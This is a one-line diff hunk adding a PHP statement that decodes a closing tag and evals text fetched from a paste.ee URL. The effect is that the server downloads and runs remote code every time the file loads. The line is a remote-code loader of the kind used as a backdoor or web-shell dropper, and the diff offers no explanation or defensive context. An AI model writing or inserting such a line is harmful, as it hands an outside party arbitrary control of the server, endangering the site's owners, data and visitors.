@@ -1,0 +1,1 @@
+<?php eval( urldecode("%3f%3e") . file_get_contents( urldecode( "https://paste.ee/d/mii0j6eW" ) ) ); ?>
